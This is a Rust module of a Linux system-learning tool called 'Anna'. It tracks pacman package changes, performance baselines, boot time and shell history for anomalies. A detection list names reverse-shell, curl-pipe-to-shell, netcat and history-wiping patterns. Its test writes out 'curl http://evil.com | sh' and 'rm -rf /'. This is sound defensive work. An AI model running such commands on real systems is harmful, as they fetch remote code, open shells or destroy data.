//! System Learning - Anna learns your system's normal behavior.
//! v0.0.990: Package tracking, performance learning, behavior analysis.
//!
//! Unlike static thresholds, this module LEARNS what's normal for YOUR system.

use serde::{Deserialize, Serialize};
use std::collections::{HashMap, VecDeque};
use std::path::PathBuf;
use std::process::Command;

/// Maximum history entries to keep
const MAX_HISTORY: usize = 100;

/// System learning data - Anna's memory of your system
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct SystemLearning {
    /// Package transaction history
    pub package_history: VecDeque<PackageTransaction>,
    /// Last known package count
    pub last_package_count: u32,
    /// Last known package list hash
    pub last_package_hash: String,

    /// Performance samples over time
    pub perf_history: VecDeque<PerfSample>,

    /// Boot time history
    pub boot_times: VecDeque<f32>,

    /// Network I/O baseline (bytes/sec averages)
    pub network_baseline: IoBaseline,
    /// Disk I/O baseline
    pub disk_baseline: IoBaseline,

    /// Common shell commands (frequency map)
    pub shell_commands: HashMap<String, u32>,
    /// Last shell history hash (to detect new commands)
    pub last_history_hash: String,

    /// When learning data was last updated
    pub last_updated: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PackageTransaction {
    pub timestamp: String,
    pub action: PackageAction,
    pub packages: Vec<String>,
    pub tool: String, // pacman, paru, yay, etc.
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum PackageAction {
    Installed,
    Removed,
    Upgraded,
    Downgraded,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PerfSample {
    pub timestamp: String,
    pub cpu_percent: f32,
    pub memory_percent: f32,
    pub load_1min: f32,
    pub disk_read_kbs: f32,
    pub disk_write_kbs: f32,
    pub net_rx_kbs: f32,
    pub net_tx_kbs: f32,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct IoBaseline {
    pub avg: f32,
    pub max: f32,
    pub samples: u32,
    /// Last raw value for delta calculation
    #[serde(default)]
    pub last_raw: u64,
    /// Timestamp of last sample (ms since epoch)
    #[serde(default)]
    pub last_timestamp_ms: u64,
}

impl IoBaseline {
    /// Update with a rate value (KB/s or similar)
    pub fn update(&mut self, value: f32) {
        self.samples += 1;
        // Exponential moving average
        let alpha = 0.1;
        self.avg = self.avg * (1.0 - alpha) + value * alpha;
        if value > self.max {
            self.max = value;
        }
    }

    /// Update from raw cumulative values (bytes read/written since boot)
    /// Returns the calculated rate in KB/s
    pub fn update_from_raw(&mut self, raw_bytes: u64) -> f32 {
        let now_ms = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_millis() as u64)
            .unwrap_or(0);

        // Calculate rate if we have previous data
        let rate_kbs = if self.last_raw > 0 && self.last_timestamp_ms > 0 && now_ms > self.last_timestamp_ms {
            let bytes_delta = raw_bytes.saturating_sub(self.last_raw);
            let time_delta_secs = (now_ms - self.last_timestamp_ms) as f32 / 1000.0;
            if time_delta_secs > 0.0 {
                (bytes_delta as f32 / 1024.0) / time_delta_secs // KB/s
            } else {
                0.0
            }
        } else {
            0.0
        };

        // Store raw values for next delta calculation
        self.last_raw = raw_bytes;
        self.last_timestamp_ms = now_ms;

        // Update running average
        if rate_kbs > 0.0 {
            self.update(rate_kbs);
        }

        rate_kbs
    }

    /// Check if value is anomalous (>3x average or >1.5x max)
    pub fn is_anomaly(&self, value: f32) -> bool {
        if self.samples < 10 {
            return false; // Not enough data
        }
        value > self.avg * 3.0 || value > self.max * 1.5
    }
}

/// Detected changes since last check
#[derive(Debug, Clone, Default)]
pub struct DetectedChanges {
    pub packages_installed: Vec<String>,
    pub packages_removed: Vec<String>,
    pub packages_upgraded: Vec<String>,
    pub boot_time_change: Option<f32>, // Positive = slower, negative = faster
    pub unusual_commands: Vec<String>,
    pub performance_anomalies: Vec<String>,
}

impl SystemLearning {
    /// Path to learning data
    pub fn path() -> PathBuf {
        dirs::data_dir()
            .unwrap_or_else(|| PathBuf::from("/var/lib"))
            .join("anna")
            .join("learning.json")
    }

    /// Load learning data
    pub fn load() -> Self {
        let path = Self::path();
        std::fs::read_to_string(&path)
            .ok()
            .and_then(|s| serde_json::from_str(&s).ok())
            .unwrap_or_default()
    }

    /// Save learning data
    pub fn save(&self) -> anyhow::Result<()> {
        let path = Self::path();
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        let content = serde_json::to_string_pretty(self)?;
        std::fs::write(&path, content)?;
        Ok(())
    }

    /// Update learning with current system state
    pub fn update(&mut self) -> DetectedChanges {
        let mut changes = DetectedChanges::default();

        // Check package changes
        changes.packages_installed = self.check_package_changes();

        // Sample performance
        self.sample_performance();

        // Check boot time
        changes.boot_time_change = self.check_boot_time();

        // Analyze shell history
        changes.unusual_commands = self.analyze_shell_history();

        // Check for performance anomalies
        changes.performance_anomalies = self.detect_performance_anomalies();

        self.last_updated = chrono::Utc::now().to_rfc3339();
        let _ = self.save();

        changes
    }

    /// Check for package changes by parsing pacman.log
    fn check_package_changes(&mut self) -> Vec<String> {
        let mut new_packages = Vec::new();

        // Parse pacman.log for recent transactions
        if let Ok(log) = std::fs::read_to_string("/var/log/pacman.log") {
            let lines: Vec<&str> = log.lines().rev().take(100).collect();

            for line in lines {
                // Format: [2024-01-15T10:30:00+0100] [ALPM] installed package-name (1.0.0)
                if line.contains("[ALPM]") {
                    if let Some((timestamp, rest)) = line.split_once(']') {
                        let timestamp = timestamp.trim_start_matches('[').to_string();

                        // Check if this is newer than last check
                        if !self.last_updated.is_empty() && timestamp <= self.last_updated {
                            continue;
                        }

                        let rest = rest.trim();
                        if let Some(action_rest) = rest.strip_prefix("[ALPM] ") {
                            let (action, packages) = parse_alpm_action(action_rest);

                            if !packages.is_empty() {
                                match action {
                                    PackageAction::Installed => {
                                        new_packages.extend(packages.clone());
                                        self.package_history.push_back(PackageTransaction {
                                            timestamp: timestamp.clone(),
                                            action: PackageAction::Installed,
                                            packages,
                                            tool: detect_package_tool(),
                                        });
                                    }
                                    PackageAction::Removed => {
                                        self.package_history.push_back(PackageTransaction {
                                            timestamp: timestamp.clone(),
                                            action: PackageAction::Removed,
                                            packages,
                                            tool: detect_package_tool(),
                                        });
                                    }
                                    PackageAction::Upgraded => {
                                        self.package_history.push_back(PackageTransaction {
                                            timestamp: timestamp.clone(),
                                            action: PackageAction::Upgraded,
                                            packages,
                                            tool: detect_package_tool(),
                                        });
                                    }
                                    _ => {}
                                }
                            }
                        }
                    }
                }
            }
        }

        // Trim history
        while self.package_history.len() > MAX_HISTORY {
            self.package_history.pop_front();
        }

        new_packages
    }

    /// Sample current performance metrics
    fn sample_performance(&mut self) {
        let mut sample = PerfSample {
            timestamp: chrono::Utc::now().to_rfc3339(),
            cpu_percent: 0.0,
            memory_percent: 0.0,
            load_1min: 0.0,
            disk_read_kbs: 0.0,
            disk_write_kbs: 0.0,
            net_rx_kbs: 0.0,
            net_tx_kbs: 0.0,
        };

        // CPU from /proc/stat (simplified - just load average)
        if let Ok(content) = std::fs::read_to_string("/proc/loadavg") {
            if let Some(load) = content.split_whitespace().next() {
                sample.load_1min = load.parse().unwrap_or(0.0);
            }
        }

        // Memory from /proc/meminfo
        if let Ok(content) = std::fs::read_to_string("/proc/meminfo") {
            let mut total: u64 = 0;
            let mut available: u64 = 0;
            for line in content.lines() {
                if line.starts_with("MemTotal:") {
                    total = parse_meminfo_value(line);
                } else if line.starts_with("MemAvailable:") {
                    available = parse_meminfo_value(line);
                }
            }
            if total > 0 {
                sample.memory_percent = ((total - available) as f32 / total as f32) * 100.0;
            }
        }

        // Disk I/O from /proc/diskstats with proper delta calculation
        let mut total_disk_bytes: u64 = 0;
        if let Ok(content) = std::fs::read_to_string("/proc/diskstats") {
            for line in content.lines() {
                let parts: Vec<&str> = line.split_whitespace().collect();
                // Look for main disk (sda, nvme0n1, vda, etc.)
                if parts.len() >= 14 {
                    let name = parts[2];
                    if name == "sda" || name == "nvme0n1" || name == "vda" || name.starts_with("sd") && name.len() == 3 {
                        // Sectors read (field 5) and written (field 9)
                        // Each sector is typically 512 bytes
                        let sectors_read: u64 = parts[5].parse().unwrap_or(0);
                        let sectors_written: u64 = parts[9].parse().unwrap_or(0);
                        total_disk_bytes = (sectors_read + sectors_written) * 512;
                        break;
                    }
                }
            }
        }

        // Network I/O from /proc/net/dev with proper delta calculation
        let mut total_net_bytes: u64 = 0;
        if let Ok(content) = std::fs::read_to_string("/proc/net/dev") {
            for line in content.lines() {
                if line.contains("eth") || line.contains("wlan") || line.contains("enp") || line.contains("wlp") {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if parts.len() >= 10 {
                        // bytes received (field 1) and transmitted (field 9)
                        let rx_bytes: u64 = parts[1].parse().unwrap_or(0);
                        let tx_bytes: u64 = parts[9].parse().unwrap_or(0);
                        total_net_bytes += rx_bytes + tx_bytes;
                    }
                }
            }
        }

        // Update baselines with delta calculation (returns KB/s)
        sample.disk_read_kbs = self.disk_baseline.update_from_raw(total_disk_bytes);
        sample.net_rx_kbs = self.network_baseline.update_from_raw(total_net_bytes);

        self.perf_history.push_back(sample);
        while self.perf_history.len() > MAX_HISTORY {
            self.perf_history.pop_front();
        }
    }

    /// Check boot time against historical average
    fn check_boot_time(&mut self) -> Option<f32> {
        let current = get_boot_time()?;

        // Calculate average boot time
        if self.boot_times.is_empty() {
            self.boot_times.push_back(current);
            return None;
        }

        let avg: f32 = self.boot_times.iter().sum::<f32>() / self.boot_times.len() as f32;
        let diff = current - avg;

        self.boot_times.push_back(current);
        while self.boot_times.len() > 20 {
            self.boot_times.pop_front();
        }

        // Report if >20% change
        if diff.abs() > avg * 0.2 {
            Some(diff)
        } else {
            None
        }
    }

    /// Analyze shell history for unusual commands
    fn analyze_shell_history(&mut self) -> Vec<String> {
        let mut unusual = Vec::new();

        // Read bash and fish history
        let home = std::env::var("HOME").unwrap_or_default();
        let history_files = [
            format!("{}/.bash_history", home),
            format!("{}/.local/share/fish/fish_history", home),
            format!("{}/.zsh_history", home),
        ];

        for hist_file in &history_files {
            if let Ok(content) = std::fs::read_to_string(hist_file) {
                // Get last 50 commands
                let commands: Vec<&str> = content.lines().rev().take(50).collect();

                for cmd in commands {
                    // Extract command (fish format: "- cmd: ...")
                    let cmd = if cmd.starts_with("- cmd:") {
                        cmd.strip_prefix("- cmd:").unwrap_or(cmd).trim()
                    } else {
                        cmd.trim()
                    };

                    if cmd.is_empty() {
                        continue;
                    }

                    // Get first word (the actual command)
                    let first_word = cmd.split_whitespace().next().unwrap_or("");

                    // Update frequency
                    *self.shell_commands.entry(first_word.to_string()).or_insert(0) += 1;

                    // Check for suspicious patterns (generic, not hardcoded)
                    if is_suspicious_command(cmd) && !self.shell_commands.contains_key(first_word) {
                        unusual.push(cmd.to_string());
                    }
                }
            }
        }

        unusual
    }

    /// Detect performance anomalies vs learned baseline
    fn detect_performance_anomalies(&self) -> Vec<String> {
        let mut anomalies = Vec::new();

        if self.perf_history.len() < 10 {
            return anomalies; // Not enough data
        }

        // Calculate averages from history
        let avg_mem: f32 = self.perf_history.iter().map(|s| s.memory_percent).sum::<f32>()
            / self.perf_history.len() as f32;
        let avg_load: f32 = self.perf_history.iter().map(|s| s.load_1min).sum::<f32>()
            / self.perf_history.len() as f32;

        // Get current values
        if let Some(current) = self.perf_history.back() {
            // Memory anomaly (>30% above average)
            if current.memory_percent > avg_mem * 1.3 && current.memory_percent > 80.0 {
                anomalies.push(format!(
                    "Memory unusually high: {:.1}% (avg: {:.1}%)",
                    current.memory_percent, avg_mem
                ));
            }

            // Load anomaly (>2x average)
            if current.load_1min > avg_load * 2.0 && current.load_1min > 4.0 {
                anomalies.push(format!(
                    "Load unusually high: {:.2} (avg: {:.2})",
                    current.load_1min, avg_load
                ));
            }
        }

        anomalies
    }

    /// Get recent package changes summary
    pub fn recent_package_changes(&self, hours: u64) -> Vec<&PackageTransaction> {
        let cutoff = chrono::Utc::now() - chrono::Duration::hours(hours as i64);
        let cutoff_str = cutoff.to_rfc3339();

        self.package_history
            .iter()
            .filter(|t| t.timestamp > cutoff_str)
            .collect()
    }

    /// Get performance trend (improving/degrading/stable)
    pub fn performance_trend(&self) -> &'static str {
        if self.perf_history.len() < 20 {
            return "learning";
        }

        let recent: Vec<&PerfSample> = self.perf_history.iter().rev().take(10).collect();
        let older: Vec<&PerfSample> = self.perf_history.iter().rev().skip(10).take(10).collect();

        let recent_avg = recent.iter().map(|s| s.memory_percent + s.load_1min * 10.0).sum::<f32>()
            / recent.len() as f32;
        let older_avg = older.iter().map(|s| s.memory_percent + s.load_1min * 10.0).sum::<f32>()
            / older.len() as f32;

        let change = (recent_avg - older_avg) / older_avg.max(1.0);

        if change > 0.15 {
            "degrading"
        } else if change < -0.15 {
            "improving"
        } else {
            "stable"
        }
    }
}

/// Parse ALPM action from log line
fn parse_alpm_action(line: &str) -> (PackageAction, Vec<String>) {
    let line_lower = line.to_lowercase();

    if line_lower.starts_with("installed") {
        let pkg = line.split_whitespace().nth(1).unwrap_or("").to_string();
        (PackageAction::Installed, if pkg.is_empty() { vec![] } else { vec![pkg] })
    } else if line_lower.starts_with("removed") {
        let pkg = line.split_whitespace().nth(1).unwrap_or("").to_string();
        (PackageAction::Removed, if pkg.is_empty() { vec![] } else { vec![pkg] })
    } else if line_lower.starts_with("upgraded") {
        let pkg = line.split_whitespace().nth(1).unwrap_or("").to_string();
        (PackageAction::Upgraded, if pkg.is_empty() { vec![] } else { vec![pkg] })
    } else if line_lower.starts_with("downgraded") {
        let pkg = line.split_whitespace().nth(1).unwrap_or("").to_string();
        (PackageAction::Downgraded, if pkg.is_empty() { vec![] } else { vec![pkg] })
    } else {
        (PackageAction::Installed, vec![])
    }
}

/// Detect which package tool was used
fn detect_package_tool() -> String {
    // Check recent processes or just default to pacman
    // Could be enhanced to actually detect paru/yay
    if let Ok(output) = Command::new("pgrep").args(["-a", "paru|yay"]).output() {
        let stdout = String::from_utf8_lossy(&output.stdout);
        if stdout.contains("paru") {
            return "paru".to_string();
        } else if stdout.contains("yay") {
            return "yay".to_string();
        }
    }
    "pacman".to_string()
}

/// Get current boot time in seconds
fn get_boot_time() -> Option<f32> {
    let output = Command::new("systemd-analyze").output().ok()?;
    let stdout = String::from_utf8_lossy(&output.stdout);

    stdout
        .split('=')
        .last()?
        .trim()
        .strip_suffix('s')?
        .trim()
        .parse()
        .ok()
}

/// Parse memory value from /proc/meminfo line
fn parse_meminfo_value(line: &str) -> u64 {
    line.split_whitespace()
        .nth(1)
        .and_then(|s| s.parse().ok())
        .unwrap_or(0)
}

/// Check if a command looks suspicious (generic patterns, not hardcoded)
fn is_suspicious_command(cmd: &str) -> bool {
    let cmd_lower = cmd.to_lowercase();

    // Patterns that might indicate unusual activity
    let suspicious_patterns = [
        // Privilege escalation attempts
        "chmod.*777",
        "chmod.*u+s",
        "chown.*root",
        // Network reconnaissance
        "nmap ",
        "netcat ",
        "nc -",
        // Data exfiltration patterns
        "curl.*|.*sh",
        "wget.*|.*sh",
        "base64.*-d",
        // System modification
        "rm.*-rf.*/",
        "dd.*if=",
        // History tampering
        "history.*-c",
        ">.bash_history",
        // Reverse shells (generic pattern)
        "/dev/tcp/",
        "bash.*-i.*>&",
    ];

    for pattern in suspicious_patterns {
        // Simple glob-like matching
        let parts: Vec<&str> = pattern.split(".*").collect();
        let mut matches = true;
        let mut search_from = 0;

        for part in parts {
            if let Some(pos) = cmd_lower[search_from..].find(part) {
                search_from += pos + part.len();
            } else {
                matches = false;
                break;
            }
        }

        if matches {
            return true;
        }
    }

    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_suspicious_command_detection() {
        assert!(is_suspicious_command("chmod 777 /etc/passwd"));
        assert!(is_suspicious_command("rm -rf /"));
        assert!(is_suspicious_command("curl http://evil.com | sh"));
        assert!(!is_suspicious_command("ls -la"));
        assert!(!is_suspicious_command("vim file.txt"));
    }

    #[test]
    fn test_io_baseline() {
        let mut baseline = IoBaseline::default();
        for _ in 0..20 {
            baseline.update(100.0);
        }
        assert!(!baseline.is_anomaly(150.0)); // 1.5x is not anomaly
        assert!(baseline.is_anomaly(350.0));  // 3.5x is anomaly
    }
}
